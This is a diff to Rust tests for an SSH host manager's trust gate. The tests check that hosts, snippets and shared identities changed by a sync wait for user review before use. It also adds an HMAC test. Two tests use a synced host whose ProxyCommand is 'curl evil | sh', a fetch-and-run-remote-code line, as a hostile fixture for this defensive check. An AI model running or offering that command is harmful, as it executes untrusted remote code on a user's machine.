@@ -11,6 +11,10 @@ fn hid(id: &str) -> HostId {
     HostId::parse(id).unwrap()
 }
 
+fn sid(id: &str) -> Subject {
+    Subject::Host(hid(id))
+}
+
 fn host(id: &str) -> Host {
     Host::new(
         hid(id),
@@ -55,13 +59,17 @@ impl Fixture {
         SyncData {
             hosts: self.hosts.snapshot().await,
             snippets: self.snippets.snapshot().await,
+            identities: Vec::new(),
         }
     }
 
     /// What `Syncer::run` does with a merge: note it, then save it.
     async fn sync(&self, after: SyncData) {
         let before = self.data().await;
-        self.trust.note(&before, &after).await.unwrap();
+        self.trust
+            .note((&before, &Prints::new()), (&after, &Prints::new()))
+            .await
+            .unwrap();
         assert!(
             self.hosts
                 .replace_if(&before.hosts, after.hosts)
@@ -78,7 +86,12 @@ impl Fixture {
 
     async fn check(&self, id: &str) -> Result<(), TrustError> {
         self.trust
-            .check(&self.hosts, Some(&self.snippets), &hid(id))
+            .check(
+                &self.hosts,
+                Some(&self.snippets),
+                async |_| Prints::new(),
+                &hid(id),
+            )
             .await
     }
 
@@ -102,12 +115,12 @@ async fn a_host_from_another_device_waits_until_accepted_as_shown() {
     assert_eq!(review.lines[0].value, "db.internal");
     let page = f
         .trust
-        .pending(&f.hosts, Some(&f.snippets), 1)
+        .pending(&f.hosts, Some(&f.snippets), &Prints::new(), 1)
         .await
         .unwrap();
     assert_eq!(page.noted, 2);
     assert_eq!(page.reviews.len(), 1, "one page");
-    assert_eq!(page.reviews[0].host, hid("other"));
+    assert_eq!(page.reviews[0].subject, sid("other"));
 
     // Changed after it was shown: the user sees it again.
     f.hosts
@@ -124,14 +137,15 @@ async fn a_host_from_another_device_waits_until_accepted_as_shown() {
         .accept(
             &f.hosts,
             Some(&f.snippets),
+            &Prints::new(),
             &[
-                (hid("theirs"), review.fingerprint),
-                (hid("other"), other.fingerprint),
+                (sid("theirs"), review.fingerprint),
+                (sid("other"), other.fingerprint),
             ],
         )
         .await
         .unwrap();
-    assert_eq!(stale, [hid("theirs")], "accepted what the user did not see");
+    assert_eq!(stale, [sid("theirs")], "accepted what the user did not see");
     f.check("other").await.unwrap();
     let now = f.review("theirs").await;
     let stale = f
@@ -139,7 +153,8 @@ async fn a_host_from_another_device_waits_until_accepted_as_shown() {
         .accept(
             &f.hosts,
             Some(&f.snippets),
-            &[(hid("theirs"), now.fingerprint)],
+            &Prints::new(),
+            &[(sid("theirs"), now.fingerprint)],
         )
         .await
         .unwrap();
@@ -147,7 +162,7 @@ async fn a_host_from_another_device_waits_until_accepted_as_shown() {
     f.check("theirs").await.unwrap();
     let left = f
         .trust
-        .pending(&f.hosts, Some(&f.snippets), 50)
+        .pending(&f.hosts, Some(&f.snippets), &Prints::new(), 50)
         .await
         .unwrap();
     assert_eq!(left.reviews, []);
@@ -169,14 +184,18 @@ async fn an_accept_between_a_note_and_its_save_holds_what_the_save_brings() {
     let mut evil = host("theirs");
     evil.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
     after.hosts.put_host(evil).unwrap();
-    f.trust.note(&before, &after).await.unwrap();
+    f.trust
+        .note((&before, &Prints::new()), (&after, &Prints::new()))
+        .await
+        .unwrap();
     // The user accepts what was shown, which is still what is saved.
     let stale = f
         .trust
         .accept(
             &f.hosts,
             Some(&f.snippets),
-            &[(hid("theirs"), shown.fingerprint)],
+            &Prints::new(),
+            &[(sid("theirs"), shown.fingerprint)],
         )
         .await
         .unwrap();
@@ -201,13 +220,21 @@ async fn a_note_another_window_saved_is_seen_here() {
     let here = Trust::open(notes.clone()).await.unwrap();
     let mut after = f.data().await;
     after.hosts.put_host(host("theirs")).unwrap();
-    other.note(&f.data().await, &after).await.unwrap();
+    other
+        .note((&f.data().await, &Prints::new()), (&after, &Prints::new()))
+        .await
+        .unwrap();
     f.hosts
         .replace_if(&f.data().await.hosts, after.hosts)
         .await
         .unwrap();
     let seen = here
-        .check(&f.hosts, Some(&f.snippets), &hid("theirs"))
+        .check(
+            &f.hosts,
+            Some(&f.snippets),
+            async |_| Prints::new(),
+            &hid("theirs"),
+        )
         .await;
     assert!(matches!(seen, Err(TrustError::NeedsReview(_))), "{seen:?}");
 }
@@ -294,7 +321,10 @@ async fn a_synced_snippet_edit_gates_the_hosts_it_starts_on() {
     );
 
     // Snippets that cannot be read type nothing: still refused.
-    let unread = f.trust.check(&f.hosts, None, &hid("mine")).await;
+    let unread = f
+        .trust
+        .check(&f.hosts, None, async |_| Prints::new(), &hid("mine"))
+        .await;
     assert!(
         matches!(unread, Err(TrustError::NeedsReview(_))),
         "{unread:?}"
@@ -312,11 +342,16 @@ async fn a_host_gone_loses_its_note_and_a_failed_save_keeps_the_old_notes() {
     after.hosts.put_host(host("other")).unwrap();
     f.notes.fail_next();
     let before = f.data().await;
-    assert!(f.trust.note(&before, &after).await.is_err());
+    assert!(
+        f.trust
+            .note((&before, &Prints::new()), (&after, &Prints::new()))
+            .await
+            .is_err()
+    );
     assert_eq!(f.notes.saved().len(), 1);
     f.review("theirs").await;
     f.sync(after).await;
-    assert_eq!(f.notes.saved().keys().collect::<Vec<_>>(), [&hid("other")]);
+    assert_eq!(f.notes.saved().keys().collect::<Vec<_>>(), [&sid("other")]);
 }
 
 #[test]
@@ -327,7 +362,7 @@ fn the_fingerprint_covers_every_line_and_the_startup_text() {
     inventory.put_host(h.clone()).unwrap();
     let mut library = Library::default();
     let print = |inventory: &Inventory, library: &Library| {
-        fingerprint(inventory, library, &hid("h")).unwrap()
+        fingerprint(inventory, library, &Prints::new(), &hid("h")).unwrap()
     };
     let missing = print(&inventory, &library);
     library.put(snippet("s", "ls\n")).unwrap();
@@ -394,9 +429,9 @@ async fn a_note_another_window_drops_meanwhile_is_made_again() {
         .await
         .unwrap();
     let before = f.data().await;
-    let approved = fingerprint(&before.hosts, &before.snippets, &hid("x")).unwrap();
+    let approved = fingerprint(&before.hosts, &before.snippets, &Prints::new(), &hid("x")).unwrap();
     let mut seen = Approvals::new();
-    seen.insert(hid("x"), Some(approved));
+    seen.insert(sid("x"), Some(approved));
     let store = Arc::new(Stale {
         first: std::sync::Mutex::new(Some(seen)),
         store: FakeTrustStore::default(),
@@ -406,8 +441,11 @@ async fn a_note_another_window_drops_meanwhile_is_made_again() {
     let mut evil = host("x");
     evil.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
     after.hosts.put_host(evil).unwrap();
-    trust.note(&before, &after).await.unwrap();
-    assert_eq!(store.store.saved().get(&hid("x")), Some(&Some(approved)));
+    trust
+        .note((&before, &Prints::new()), (&after, &Prints::new()))
+        .await
+        .unwrap();
+    assert_eq!(store.store.saved().get(&sid("x")), Some(&Some(approved)));
 }
 
 #[tokio::test]
@@ -421,7 +459,8 @@ async fn an_accepted_host_stays_accepted_through_the_user_s_own_edit() {
         .accept(
             &f.hosts,
             Some(&f.snippets),
-            &[(hid("theirs"), shown.fingerprint)],
+            &Prints::new(),
+            &[(sid("theirs"), shown.fingerprint)],
         )
         .await
         .unwrap();
@@ -437,7 +476,10 @@ async fn an_accepted_host_stays_accepted_through_the_user_s_own_edit() {
         .await
         .unwrap();
     f.trust
-        .rebase((&before, &library), (&now, &library))
+        .rebase(
+            (&before, &library, &Prints::new()),
+            (&now, &library, &Prints::new()),
+        )
         .await
         .unwrap();
     f.check("theirs").await.unwrap();
@@ -454,7 +496,10 @@ async fn an_accepted_host_stays_accepted_through_the_user_s_own_edit() {
     synced.hosts.put_host(evil).unwrap();
     f.sync(synced).await;
     f.trust
-        .rebase((&before, &library), (&now, &library))
+        .rebase(
+            (&before, &library, &Prints::new()),
+            (&now, &library, &Prints::new()),
+        )
         .await
         .unwrap();
     f.review("theirs").await;
@@ -471,7 +516,8 @@ async fn a_local_edit_of_a_host_still_held_keeps_it_held() {
         .accept(
             &f.hosts,
             Some(&f.snippets),
-            &[(hid("theirs"), shown.fingerprint)],
+            &Prints::new(),
+            &[(sid("theirs"), shown.fingerprint)],
         )
         .await
         .unwrap();
@@ -491,7 +537,10 @@ async fn a_local_edit_of_a_host_still_held_keeps_it_held() {
         .await
         .unwrap();
     f.trust
-        .rebase((&before, &library), (&now, &library))
+        .rebase(
+            (&before, &library, &Prints::new()),
+            (&now, &library, &Prints::new()),
+        )
         .await
         .unwrap();
     f.review("theirs").await;
@@ -512,7 +561,8 @@ async fn a_snippet_a_sync_changes_after_the_user_lists_it_is_held() {
         .accept(
             &f.hosts,
             Some(&f.snippets),
-            &[(hid("theirs"), shown.fingerprint)],
+            &Prints::new(),
+            &[(sid("theirs"), shown.fingerprint)],
         )
         .await
         .unwrap();
@@ -534,8 +584,236 @@ async fn a_snippet_a_sync_changes_after_the_user_lists_it_is_held() {
         .unwrap();
     f.sync(synced).await;
     f.trust
-        .rebase((&before, &library), (&now, &library))
+        .rebase(
+            (&before, &library, &Prints::new()),
+            (&now, &library, &Prints::new()),
+        )
         .await
         .unwrap();
     f.review("theirs").await;
+}
+
+#[test]
+fn the_keyed_digest_is_hmac_sha256_over_length_prefixed_parts() {
+    // RFC 4231's first key, zero-padded as HMAC pads it; the message is the
+    // part's length as 8 bytes, then the part. Checked against Python's
+    // `hmac`.
+    let mut key = [0u8; 32];
+    key[..20].copy_from_slice(&[0x0b; 20]);
+    let hex = keyed_digest(&key, &[b"Hi There"])
+        .iter()
+        .fold(String::new(), |mut hex, b| {
+            use std::fmt::Write as _;
+            let _ = write!(hex, "{b:02x}");
+            hex
+        });
+    assert_eq!(
+        hex,
+        "7f576cd063ed3e3615e6bf957fc801d0f4d8cf70bc1a604ab2ba1d06c8732e2e"
+    );
+}
+
+fn print(digest: u8) -> IdentityPrint {
+    IdentityPrint {
+        digest: [digest; 32],
+        lines: vec![("identity user", "ops".into())],
+    }
+}
+
+#[tokio::test]
+async fn a_shared_identity_changed_elsewhere_holds_the_hosts_using_it() {
+    let f = fixture().await;
+    f.hosts
+        .edit(|inventory| {
+            let mut h = host("db");
+            h.settings.identity = Some(tauminus_domain::IdentityId::parse("id1").unwrap());
+            inventory.put_host(h)?;
+            inventory.put_host(host("other"))
+        })
+        .await
+        .unwrap();
+    let data = f.data().await;
+    let was = Prints::from([("id1".to_owned(), print(1))]);
+    let now = Prints::from([("id1".to_owned(), print(2))]);
+    f.trust.note((&data, &was), (&data, &now)).await.unwrap();
+    let held = f
+        .trust
+        .check(
+            &f.hosts,
+            Some(&f.snippets),
+            async |_| now.clone(),
+            &hid("db"),
+        )
+        .await;
+    let Err(TrustError::NeedsReview(review)) = held else {
+        panic!("a changed identity is used unseen: {held:?}");
+    };
+    assert!(
+        review
+            .lines
+            .iter()
+            .any(|l| l.place == "identity" && l.field == "identity user"),
+        "{:?}",
+        review.lines
+    );
+    f.check("other").await.unwrap();
+    // As it was before: the change did not land after all.
+    f.trust
+        .check(
+            &f.hosts,
+            Some(&f.snippets),
+            async |_| was.clone(),
+            &hid("db"),
+        )
+        .await
+        .unwrap();
+    // The user's own edit of it moves the note along.
+    let library = f.snippets.snapshot().await;
+    f.trust
+        .rebase((&data.hosts, &library, &was), (&data.hosts, &library, &now))
+        .await
+        .unwrap();
+    f.trust
+        .check(
+            &f.hosts,
+            Some(&f.snippets),
+            async |_| now.clone(),
+            &hid("db"),
+        )
+        .await
+        .unwrap();
+}
+
+#[test]
+fn a_subject_reads_back_as_written_and_a_host_id_never_passes_for_an_identity() {
+    for text in ["db", "identity:k1"] {
+        assert_eq!(Subject::parse(text).unwrap().to_string(), text);
+    }
+    assert_eq!(
+        Subject::parse("identity:k1"),
+        Some(Subject::Identity("k1".into()))
+    );
+    for bad in ["identity:", "identity:a b", "a:b", ""] {
+        assert_eq!(Subject::parse(bad), None, "{bad}");
+    }
+}
+
+fn print_of(digest: u8) -> IdentityPrint {
+    IdentityPrint {
+        digest: [digest; 32],
+        lines: vec![("identity", "deploy".into())],
+    }
+}
+
+#[tokio::test]
+async fn an_identity_a_sync_changed_waits_and_the_user_s_own_edit_moves_its_note() {
+    let f = fixture().await;
+    let data = f.data().await;
+    let prints = |d| Prints::from([("k1".to_owned(), print_of(d))]);
+    let check = async |p: &Prints| f.trust.check_identity(async |_| p.clone(), "k1").await;
+    f.trust
+        .note((&data, &Prints::new()), (&data, &prints(1)))
+        .await
+        .unwrap();
+    assert!(matches!(check(&prints(1)).await, Err(TrustError::NeedsReview(r)) if r.new));
+    let stale = f
+        .trust
+        .accept(
+            &f.hosts,
+            Some(&f.snippets),
+            &prints(1),
+            &[(Subject::Identity("k1".into()), Fingerprint([1; 32]))],
+        )
+        .await
+        .unwrap();
+    assert_eq!(stale, []);
+    check(&prints(1)).await.unwrap();
+    // Another device changes it: held, and shown as it is now.
+    f.trust
+        .note((&data, &prints(1)), (&data, &prints(2)))
+        .await
+        .unwrap();
+    match check(&prints(2)).await {
+        Err(TrustError::NeedsReview(review)) => {
+            assert_eq!(review.label, "deploy");
+            assert_eq!(review.lines[0].place, "identity");
+        }
+        other => panic!("{other:?}"),
+    }
+    // An edit here of what was approved moves the approval along.
+    f.trust
+        .accept(
+            &f.hosts,
+            Some(&f.snippets),
+            &prints(2),
+            &[(Subject::Identity("k1".into()), Fingerprint([2; 32]))],
+        )
+        .await
+        .unwrap();
+    let (inventory, library) = (f.hosts.snapshot().await, f.snippets.snapshot().await);
+    f.trust
+        .rebase(
+            (&inventory, &library, &prints(2)),
+            (&inventory, &library, &prints(3)),
+        )
+        .await
+        .unwrap();
+    check(&prints(3)).await.unwrap();
+    // Locked, there is no print: held.
+    assert!(check(&Prints::new()).await.is_err());
+}
+
+#[tokio::test]
+async fn a_host_with_no_note_waits_while_the_identity_it_uses_does() {
+    let f = fixture().await;
+    let data = f.data().await;
+    let was = Prints::from([("k1".to_owned(), print_of(1))]);
+    let now = Prints::from([("k1".to_owned(), print_of(2))]);
+    let check = async |p: &Prints| {
+        f.trust
+            .check(
+                &f.hosts,
+                Some(&f.snippets),
+                async |_| p.clone(),
+                &hid("mine"),
+            )
+            .await
+    };
+    // A sync changes the identity; then a host made here uses it.
+    f.trust.note((&data, &was), (&data, &now)).await.unwrap();
+    let mut mine = host("mine");
+    mine.settings.identity = Some(tauminus_domain::IdentityId::parse("k1").unwrap());
+    f.hosts.edit(|i| i.put_host(mine)).await.unwrap();
+    assert!(
+        !f.notes.saved().contains_key(&sid("mine")),
+        "no note of its own"
+    );
+    match check(&now).await {
+        Err(TrustError::NeedsReview(review)) => {
+            assert_eq!(review.subject, Subject::Identity("k1".into()));
+        }
+        other => panic!("{other:?}"),
+    }
+    f.trust
+        .accept(
+            &f.hosts,
+            Some(&f.snippets),
+            &now,
+            &[(Subject::Identity("k1".into()), Fingerprint([2; 32]))],
+        )
+        .await
+        .unwrap();
+    check(&now).await.unwrap();
+    // An id no vault makes is never noted: the list must read back.
+    let bad = Prints::from([("a:b".to_owned(), print_of(3))]);
+    f.trust
+        .note((&data, &Prints::new()), (&data, &bad))
+        .await
+        .unwrap();
+    assert!(
+        f.notes
+            .saved()
+            .keys()
+            .all(|s| s.to_string() != "identity:a:b")
+    );
 }
